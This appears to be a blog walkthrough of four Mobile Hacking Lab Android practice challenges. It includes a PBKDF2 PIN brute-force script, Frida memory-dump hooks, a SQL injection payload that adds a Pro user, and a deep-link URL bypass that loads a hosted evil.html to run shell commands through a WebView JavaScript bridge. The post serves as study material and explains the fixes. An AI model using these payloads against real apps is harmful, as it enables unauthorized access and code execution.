---
title: Mobile Hacking Lab - Beginner Challenges Walkthrough
date: 2026-10-18
categories: [Android, Pentesting]
tags: [android, re, frida, sqli, webview, ctf]
---

Hello all! It's been a while. I got some time recently to go through the Mobile Hacking Lab beginner challenges, and I thought I'd write them all up in one post. I went in with not a lot of Frida experience, so a good chunk of this is me fumbling around and figuring things out as I went. I'm keeping the dead ends in, because honestly that's where I learned the most.

This covers four challenges - Secret Code, Strings, Food Store and Guess Me. Let's go.

## Secret Code

This one ships a `config.properties` file in the assets, and a `ContentProvider` that decrypts a secret if you give it the right PIN.

The config loader just reads four values out of the properties file:

```java
this.encryptedSecret = Base64.decode(properties.getProperty("encryptedSecret"), 0);
this.salt = Base64.decode(properties.getProperty("salt"), 0);
this.iv = Base64.decode(properties.getProperty("iv"), 0);
this.iterationCount = Integer.parseInt(properties.getProperty("iterationCount"));
```

So the salt, IV, iteration count and the ciphertext are all sitting in plaintext inside the APK. The only thing missing is the key.

Then the provider:

```java
String format = String.format("%04d", Integer.parseInt(removePrefix));
m130constructorimpl = Result.m130constructorimpl($this$query.decryptSecret(format));
```

The `pin=` value gets formatted with `%04d`, so the "password" is always a 4 digit PIN. And the key derivation is just PBKDF2:

```java
PBEKeySpec keySpec = new PBEKeySpec(charArray, bArr, this.iterationCount, 256);
SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
```

So the whole thing is PBKDF2-HMAC-SHA1(PIN, salt, 10000) -> AES-256 key -> AES/CBC decrypt. The key space is 0000-9999, which is 10000 guesses. That's nothing. And since every other value is in the APK, I don't even need the app - I can just brute force it offline.

The values I needed are all in `config.properties` - the Base64 ciphertext, salt and IV, plus `iterationCount = 10000`. I'm not pasting the actual secret material here, but you grab them straight out of the file.

And the brute force:

```python
import base64, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# pull these three straight from config.properties
enc   = base64.b64decode("<encryptedSecret from config.properties>")
salt  = base64.b64decode("<salt from config.properties>")
iv    = base64.b64decode("<iv from config.properties>")

for n in range(10000):
    pin = f"{n:04d}"
    key = hashlib.pbkdf2_hmac("sha1", pin.encode(), salt, 10000, 32)
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    pt  = dec.update(enc) + dec.finalize()
    pad = pt[-1]
    if 1 <= pad <= 16 and pt[-pad:] == bytes([pad]) * pad:
        try:
            print(pin, pt[:-pad].decode())
        except UnicodeDecodeError:
            pass
```

The trick here is that AES-CBC will "decrypt" with any key and never error, so I can't just look for success. Instead I check the PKCS7 padding and whether the output is clean UTF-8. Wrong PINs give garbage with bad padding, the right one gives readable text. One PIN comes out clean and that's the secret.

The actual bug is that the `ContentProvider` is exported and hands out the ciphertext + salt + IV for free, and the secret is only protected by a 4 digit PIN with no rate limiting. Good crypto, terrible secret.

## Strings

This is the one where I had to actually set up Frida properly, and it fought me a bit.

First attempt to spawn just gave me:

```
Failed to spawn: need Gadget to attach on jailed Android
```

That error is misleading. It really means frida-server isn't running on the device. So I pushed frida-server... and then hit the real problem: my emulator was a Google Play image, which is a locked `user` build, so `adb root` just says `adbd cannot run as root in production builds`. frida-server needs root. I burned some time here booting different AVDs that all turned out to be Play Store images too.

The lesson: the thing that blocks root is not the API level, it's the **Google Play** tag. Any non-Play image (default / google_apis / aosp) is rootable. Once I made a plain image AVD, `adb root` worked, and:

```bash
adb push frida-server-16.1.8-android-arm64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "nohup /data/local/tmp/frida-server >/dev/null 2>&1 &"
frida-ps -U
```

Now onto the actual challenge. `Activity2.onCreate` is the target:

```java
String u_1 = sharedPreferences.getString("UUU0133", null);
boolean isActionView = Intrinsics.areEqual(getIntent().getAction(), "android.intent.action.VIEW");
boolean isU1Matching = Intrinsics.areEqual(u_1, cd());
if (isActionView && isU1Matching) {
    ...
    String str = decrypt("AES/CBC/PKCS5Padding", "bqGrDKdQ8zo26HflRsGvVA==", new SecretKeySpec(bytes, "AES"));
    if (str.equals(ds)) {
        System.loadLibrary("flag");
        String s = getflag();
        Toast.makeText(getApplicationContext(), s, 1).show();
```

So there are a few gates - the intent has to be an `ACTION_VIEW` deep link, a shared pref `UUU0133` has to equal `cd()`, and the deep link path has to match a decrypt output.

`cd()` turned out to be just today's date, which I confirmed with my first ever Frida hook:

```javascript
Java.perform(function () {
    var A2 = Java.use("com.mobilehackinglab.challenge.Activity2");
    A2.cd.implementation = function () {
        var ret = this.cd();
        console.log("[cd] returned:", ret);
        return ret;
    };
});
```

Side note that confused me for a bit - hooks are passive. Nothing prints until the app actually calls the method. I had to fire the deep link to trigger it:

```bash
adb shell am start -a android.intent.action.VIEW -d "mhl://labs/test" com.mobilehackinglab.challenge
```

`cd()` returned `17/10/2026`. The shared pref `UUU0133` (in the prefs file `DAD4`) was null, because nothing in the app ever writes it. So I needed to set it. Since I'm rooted I just wrote the XML file directly:

```bash
adb shell "cat > /data/data/com.mobilehackinglab.challenge/shared_prefs/DAD4.xml <<'EOF'
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name=\"UUU0133\">17/10/2026</string>
</map>
EOF"
adb shell "chown 10126:10126 /data/data/com.mobilehackinglab.challenge/shared_prefs/DAD4.xml"
adb shell "restorecon /data/data/com.mobilehackinglab.challenge/shared_prefs/DAD4.xml"
```

My first few deep link attempts crashed with `bad base-64` - that was because my path segment wasn't valid base64. Once I fixed that, the app finally showed a Toast... that said **"Success"**. Not a flag.

That had me stuck. I thought maybe it was anti-Frida, so I did the whole thing with no Frida attached. Still "Success". So "Success" is just a hardcoded decoy.

`getflag()` is a native method, so I decompiled `libflag.so`. The function does this:

```c
void getflag(...) {
    _Z9flag_fillv();          // flag_fill()
    _Z6flag13v();
    ... a pile of tiny ops ...
    _ZN7_JNIEnv12NewStringUTFEPKc(param_1,"Success");   // returns "Success"
}
```

So it builds something in memory with all those helpers, then throws it away and returns "Success". `flag_fill` writes to a global buffer at `DAT_00104023`. The flag is assembled in memory and never returned - which is literally what the challenge is called.

So I dumped the buffer at runtime instead of reversing every helper:

```javascript
Java.perform(function () {
    var A2 = Java.use("com.mobilehackinglab.challenge.Activity2");
    A2.getflag.implementation = function () {
        var ret = this.getflag();
        var base = Module.findBaseAddress("libflag.so");
        console.log(hexdump(base.add(0x4000), { length: 0x200, ansi: false }));
        return ret;
    };
});
```

`readUtf8String` at `0x4023` threw on byte `0xae` - that was the encrypted input buffer, not the output. The decoded flag landed a few bytes later. Scanning a wider window showed it sitting in the ASCII column of the hexdump as a clean `MHL{...}` string (redacting the actual flag here).

The flag name itself was basically telling me the whole approach - the answer was in memory the entire time, which is also why plain `strings` on the binary never found it.

## Food Store

This app has a signup form, and the goal is to become a Pro user. The `isPro` flag is hardcoded to 0 on registration, so normal signup never makes you Pro.

The interesting bit is in `DBHelper.addUser`:

```java
String sql = "INSERT INTO users (username, password, address, isPro) VALUES ('" + Username + "', '" + encodedPassword + "', '" + encodedAddress + "', 0)";
db.execSQL(sql);
```

Password and address get base64 encoded, but the username goes straight into the SQL string. Classic injection.

I tried to automate filling the fields with Frida and clicking signup, and this is where I wasted some time. I called `onCreate$lambda$1`, and nothing happened. Turns out `lambda$1` is the **back button** (`this$0.finish()`) - the signup handler is `lambda$0`. So I was just closing the screen. Lesson: check which lambda is which before assuming.

Then the payloads. My first try used double quotes, `test, admin, encodedAddress, 1 "--`. It "registered successfully" but did nothing useful, because SQLite strings use single quotes - double quotes don't close anything, so the whole thing just sat inside the username column.

So I switched to single quotes with a comment:

```
prohacker', 'cGFzc3dvcmQ=', 'addr', 1)--
```

And the app crashed. No registration at all. This one took me a while to understand. The query looked valid to me on paper. The problem is that `Base64.encodeToString(bytes, 0)` **adds a trailing newline**. A `--` comment in SQLite only runs to the end of the line, so that injected newline ended my comment early and left the rest of the statement as garbage -> syntax error -> crash.

The fix was to stop relying on `--` and turn it into a two-row insert instead, so the leftover columns become a valid second row:

```
prohacker', 'cGFzc3dvcmQ=', 'YWRkcg==', 1), ('z
```

Which builds:

```sql
INSERT INTO users (username,password,address,isPro) VALUES
('prohacker', 'cGFzc3dvcmQ=', 'YWRkcg==', 1), ('z', 'encPass\n', 'encAddr\n', 0)
```

Row one is my Pro user, row two (`z`) absorbs the appended columns. No comment needed, so the newline doesn't matter anymore. `cGFzc3dvcmQ=` is base64 of `password`, and login base64-decodes the stored value before comparing, so:

Login as `prohacker` / `password` and I'm in as a Pro user. Checking the db confirms it:

```
3|prohacker|cGFzc3dvcmQ=|YWRkcg==|1
```

`isPro = 1`. The fix would be a parameterized insert with bound args, like the login query already uses.

## Guess Me

This was my favourite one. It's a WebView challenge that ends in RCE.

`WebviewActivity` is exported and handles `mhl://mobilehackinglab` deep links. The validation is:

```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!uri.getScheme().equals("mhl") && !uri.getScheme().equals("https")) || !uri.getHost().equals("mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && queryParameter.endsWith("mobilehackinglab.com");
}
```

So it only checks that the `url` parameter **ends with** `mobilehackinglab.com`, and then loads it into a WebView. And that WebView has JavaScript on and a bridge:

```java
webSettings.setJavaScriptEnabled(true);
webView.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
```

```java
@JavascriptInterface
public final String getTime(String Time) {
    Process process = Runtime.getRuntime().exec(Time);
    ...
}
```

So any page loaded in this WebView can call `AndroidBridge.getTime("<command>")` and run shell commands. The bridge methods have no callers in the Java code, by the way - they're called from the JavaScript in the bundled `assets/index.html`. That threw me at first until I realised the usages live in the web layer, not the decompiled code.

First I tried a plain deep link and got `unable to resolve`, because the manifest filter is `mhl` only and I was sending `https`. For local testing I just pinned the component explicitly:

```bash
adb shell am start -n com.mobilehackinglab.guessme/.WebviewActivity -a android.intent.action.VIEW -d "<uri>"
```

Then I spent a while getting the URL right. A few failed tries:

- `https://example.com/url=mobilehackinglab.com` -> loaded the default page, because `url=...` was in the path, not a real `?url=` query param, so `getQueryParameter` was null.
- `https://mobilehackinglab@example.com/...` -> still default, because `getHost()` returns the part after the `@` (`example.com`), not the userinfo.

The thing to get is that `getHost()` and the `url` param are two different fields, and `endsWith` only looks at the end of the string while the WebView parses it as a real URL. Once I lined those up I got the host right and the WebView loading my URL:

```
https://mobilehackinglab?url=example.com@10.0.2.2:8000/evil.html/mobilehackinglab.com
```

This loaded `example.com` (the `@` makes `example.com` the real host, the trailing bit is just the path to satisfy `endsWith`). But when I pointed it at my own server it 404'd - because `/evil.html/mobilehackinglab.com` is a path, so the server looked for a file that doesn't exist. The suffix I needed for the check was breaking my file path.

The fix was to put the suffix in the query string instead, where it doesn't affect which file gets served:

```
url=example.com@10.0.2.2:8000/evil.html?test=mobilehackinglab.com
```

Now the server serves `evil.html`, and `?test=mobilehackinglab.com` keeps `endsWith` happy. My `evil.html` is just:

```html
<html><body><script>
  var out = AndroidBridge.getTime("id");
  document.body.innerText = out;
</script></body></html>
```

Served with a one liner on my machine (the emulator reaches the host at `10.0.2.2`, not localhost):

```bash
python3 -m http.server 8000
```

Final payload:

```bash
adb shell am start -n com.mobilehackinglab.guessme/.WebviewActivity -a android.intent.action.VIEW -d "https://mobilehackinglab?url=example.com@10.0.2.2:8000/evil.html?test=mobilehackinglab.com"
```

And the page came back with `uid=10128(...)` - command execution as the app's sandboxed user. RCE.

The bug chain: weak suffix validation (should be a parsed host allowlist) + a WebView that loads attacker controlled URLs + a JavaScript bridge that reaches `Runtime.exec`.

## Wrapping up

That's the four. The recurring theme across all of them is trusting the wrong thing - an exported provider, a value in a pref, a raw string in SQL, a substring check on a URL. Also I'm a lot more comfortable with Frida now than when I started, which was the whole point.

If you spot anything I got wrong or explained badly, let me know. Onto the next set.
